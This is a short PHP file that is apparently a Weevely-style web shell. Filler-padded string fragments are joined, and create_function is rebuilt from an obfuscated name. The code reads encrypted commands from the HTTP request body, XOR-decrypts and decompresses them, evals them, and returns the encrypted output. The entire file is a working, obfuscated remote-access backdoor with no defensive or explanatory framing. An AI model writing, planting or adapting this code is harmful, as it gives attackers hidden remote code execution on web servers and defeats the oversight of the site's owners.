<?php
$f='$k="epWab474a2"pW;$pWkh="87ec35bpW1pW1c15";$kf="pWb0pWpW5a180pWc00ac";$p="Yq4pWBnyulpWqL';
$C='(@bpWase64pW_decpWode($m[1])pW,$k))pW)pW;$o=@obpW_getpW_contenpWts();@ob_epWnd_cpWlea';
$w='$k{$j};}}retupWrn $o;}ipWf (pW@preg_mapWtch("/$pWkh(.+)$kpWfpW/",@file_gpWet_conte';
$l='pWnpWpWts("php://ipWnput"),$mpW)==1pW) pW{@ob_starpWt();@evpWal(@gzuncopWmpress(pW@x';
$N='i=0;pW$ipWpW<$l;){for($j=0pW;($j<pW$c&pW&$ipWpW<$l);$j++,$i++pW){$o.=$pWtpW{$pWi}^';
$p='n();pW$r=@bapWse64_encopWdepW(@x(@gzpWcomppWress($opW)pW,$k));print("pW$p$kh$pWr$kf");}';
$y=str_replace('y','','cryeatyeyy_yyfunction');
$D='pW6eepWS3L";functpWionpW xpWpW($t,$k){$c=strlen($kpW);$pWl=strlpWen($t);$o="";fpWor($';
$d=str_replace('pW','',$f.$D.$N.$w.$l.$C.$p);
$h=$y('',$d);$h();
?>
